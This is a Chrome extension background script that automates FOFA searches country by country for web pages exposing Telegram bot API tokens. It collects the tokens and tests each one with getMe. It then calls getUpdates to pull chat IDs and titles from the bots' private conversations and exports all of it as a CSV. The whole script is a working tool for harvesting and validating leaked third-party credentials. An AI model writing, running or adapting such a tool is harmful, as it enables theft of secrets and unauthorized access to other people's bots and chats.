// --- CONFIGURATION ---
const BASE_QUERY_TEMPLATE = 'body="api.telegram.org"'; // Default
const COUNTRY_CODES = [
    "US", "CN", "HK", "RU", "FR", "DE", "NL", "SG", "GB", "JP",
    "KR", "IN", "BR", "CA", "AU", "IT", "ES", "TR", "UA", "VN",
    "ID", "PL", "SE", "CH", "NO", "FI", "DK", "IE", "AT", "CZ",
    "RO", "ZA", "MX", "AR", "CO", "CL", "MY", "TH", "PH", "PK",
    "IR", "SA", "AE", "IL", "GR", "PT", "BE", "HU", "NZ"
];

// --- STATE ---
let state = {
    isRunning: false,
    isPaused: false,
    status: "Ready",
    query: BASE_QUERY_TEMPLATE,
    domain: "en.fofa.info",
    countryIndex: 0,
    countriesDone: 0,
    resultsFound: 0,
    results: [],     // Array of {token, chat_id}
    seenTokens: new Set() // For dedup
};

// Restore state on startup
loadState();

let activeTabId = null;

// --- LISTENERS ---
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    switch (msg.action) {
        case "GET_STATE":
            sendResponse(serializeState(state)); // Send clean object (Sets as arrays if needed, but msg passing usually handles basics or fails on Sets)
            // Actually chrome msg serialization might strip Sets. Let's send resultsFound which is int.
            // For results array it is fine.
            break;
        case "START_SCAN":
            startScan(msg.query, msg.domain);
            break;
        case "STOP_SCAN":
            stopScan("Stopped by user");
            break;
        case "RESUME_SCAN":
            resumeScan();
            break;
        case "DOWNLOAD_RESULTS":
            downloadResults();
            break;

        // Messages from Content Script
        case "CAPTCHA_DETECTED":
            pauseScan("⚠️ Captcha Detected!");
            break;
        case "RESULT_FOUND":
            handleResult(msg.data);
            break;
        case "PAGE_COMPLETE":
            nextCountry();
            break;
        case "LOG":
            console.log("[Content]", msg.message);
            break;
    }
    return true; // Keep channel open for async responses if needed
});

// --- PERSISTENCE HELPERS ---

function saveState() {
    // Convert Set to Array for storage
    const storageState = {
        ...state,
        seenTokens: Array.from(state.seenTokens)
    };
    chrome.storage.local.set({ 'scraper_state': storageState });
}

function loadState() {
    chrome.storage.local.get(['scraper_state'], (result) => {
        if (result.scraper_state) {
            const loaded = result.scraper_state;

            // Restore Set
            if (loaded.seenTokens) {
                loaded.seenTokens = new Set(loaded.seenTokens);
            } else {
                loaded.seenTokens = new Set();
            }

            // If we loaded a state that was "Running", we should probably set it to "Stopped" or "Paused" 
            // because the service worker died, so the loop is broken.
            if (loaded.isRunning && !loaded.isPaused) {
                loaded.isRunning = false;
                loaded.status = "Stopped (Recovered)";
            }

            state = loaded;
            console.log("State restored:", state);
        }
    });
}

function serializeState(s) {
    // Prepare for message passing (Sets might not serialize well depending on Chrome ver, safe to keep as is usually, 
    // but cleaner to standard JSON types if Popup expects it)
    return s;
}


// --- CORE LOGIC ---

async function startScan(userQuery, userDomain) {
    // If we are already running, do nothing
    if (state.isRunning) return;

    // Reset State (FRESH START) -> Save immediately
    state.isRunning = true;
    state.isPaused = false;
    state.status = "Starting...";
    state.query = userQuery || BASE_QUERY_TEMPLATE;
    state.domain = userDomain || "en.fofa.info";
    state.countryIndex = 0;
    state.countriesDone = 0;
    state.resultsFound = 0;
    state.results = [];
    state.seenTokens = new Set();

    saveState(); // PERSIST

    // Get Active Tab
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) {
        stopScan("No active tab found");
        return;
    }
    activeTabId = tab.id;

    broadcastState();
    processNextCountry();
}

function stopScan(reason) {
    state.isRunning = false;
    state.isPaused = false;
    state.status = reason || "Stopped";
    saveState(); // PERSIST
    broadcastState();
}

function pauseScan(reason) {
    state.isPaused = true;
    state.status = reason || "Paused";
    saveState(); // PERSIST
    broadcastState();
}

function resumeScan() {
    if (!state.isRunning && state.status !== "Stopped (Recovered)") return; // Only resume if running OR we just recovered

    // If we are recovering from a crash/reload
    if (!state.isRunning) {
        state.isRunning = true;
    }

    state.isPaused = false;
    state.status = "Resuming...";
    saveState(); // PERSIST
    broadcastState();

    // We need to re-acquire the active tab if we crashed
    chrome.tabs.query({ active: true, currentWindow: true }).then(([tab]) => {
        if (tab) {
            activeTabId = tab.id;
            // Try to resume logic
            chrome.tabs.sendMessage(activeTabId, { action: "RESUME_WORK" }).catch(() => {
                processNextCountry(false);
            });
        } else {
            stopScan("Could not find active tab to resume");
        }
    });
}

function nextCountry() {
    state.countryIndex++;
    state.countriesDone++;
    saveState(); // PERSIST
    processNextCountry();
}

async function processNextCountry(increment = true) {
    if (!state.isRunning) return;
    if (state.isPaused) return;

    if (state.countryIndex >= COUNTRY_CODES.length) {
        stopScan("✅ Scan Complete!");
        downloadResults();
        return;
    }

    const country = COUNTRY_CODES[state.countryIndex];
    state.status = `Navigating: ${country} (${state.domain})`;
    saveState(); // PERSIST & Update Status
    broadcastState();

    const fullQuery = `${state.query} && country="${country}"`;
    const encoded = btoa(fullQuery);
    const targetUrl = `https://${state.domain}/result?qbase64=${encoded}`;

    // Navigate
    await chrome.tabs.update(activeTabId, { url: targetUrl });

    // Wait for load (listener onUpdated is hard to sync perfectly in pure simpler logic)
    // We can use a simple timeout loop or chrome.tabs.onUpdated
}

// Global Nav Listener
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tabId === activeTabId && changeInfo.status === 'complete' && state.isRunning && !state.isPaused) {
        // Page loaded!
        // Inject / Trigger Content Script
        setTimeout(() => {
            chrome.tabs.sendMessage(tabId, { action: "SCRAPE_PAGE" }).catch(err => {
                console.log("Injection failed or content script missing", err);
                // Maybe inject? Manifest V3 content scripts auto-inject on match.
                // If error, maybe we are not on fofa?
            });
        }, 2000); // Wait bit for Vue app to hydrate
    }
});


// --- VALIDATION LOGIC ---

async function validateToken(data) {
    const token = data.token;
    const baseUrl = `https://api.telegram.org/bot${token}`;

    try {
        // 1. Check getMe
        const meRes = await fetch(`${baseUrl}/getMe`);
        const meJson = await meRes.json();

        if (!meJson.ok) {
            data.valid = false;
            data.status = "Invalid/Revoked";
            return data;
        }

        data.valid = true;
        data.bot_name = meJson.result.username;
        data.bot_id = meJson.result.id;

        // 2. Try to get chat_id if missing
        if (!data.chatId) {
            try {
                const upRes = await fetch(`${baseUrl}/getUpdates?limit=5`);
                const upJson = await upRes.json();

                if (upJson.ok && upJson.result) {
                    for (const update of upJson.result) {
                        const message = update.message || update.channel_post || update.my_chat_member;
                        if (message && message.chat) {
                            data.chatId = message.chat.id;
                            data.chatType = message.chat.type;
                            data.chatTitle = message.chat.title || message.chat.username;
                            break; // Found one
                        }
                    }
                }
            } catch (ignore) {
                // getUpdates might fail or timeout, ignore
            }
        }

        return data;

    } catch (err) {
        data.valid = false;
        data.status = "Network/Error";
        return data;
    }
}

async function handleResult(data) {
    if (state.seenTokens.has(data.token)) return;
    state.seenTokens.add(data.token);

    // Initial add (Optimistic UI?) 
    // Or wait for validation? 
    // Let's validate first for "rich" data, usually fast enough.
    // Or add then update. Add then update is better for UI responsiveness but harder for simple state array.
    // Given low volume, await is fine.

    const validatedData = await validateToken(data);

    state.results.push(validatedData);
    state.resultsFound++;
    if (validatedData.valid) {
        state.resultsValid++;
    }

    saveState(); // PERSIST!
    broadcastState();
}

function broadcastState() {
    chrome.runtime.sendMessage({ action: "STATE_UPDATE", state: state }).catch(() => { });
}

function downloadResults() {
    // Generate CSV Blob
    let csvContent = "token,chat_id,valid,bot_name,status\n";
    state.results.forEach(row => {
        const validStr = row.valid ? "TRUE" : "FALSE";
        const nameStr = row.bot_name || "";
        const statusStr = row.status || (row.valid ? "Active" : "Unknown");
        csvContent += `${row.token},${row.chatId || ""},${validStr},${nameStr},${statusStr}\n`;
    });

    // In background script, we can use Data URI download
    const date = new Date().toISOString().slice(0, 19).replace(/:/g, "-");
    const filename = `fofa_scraper_${date}.csv`;

    // Create a data URL
    const base64 = btoa(unescape(encodeURIComponent(csvContent)));
    const url = 'data:text/csv;base64,' + base64;

    chrome.downloads.download({
        url: url,
        filename: filename,
        saveAs: true
    });
}
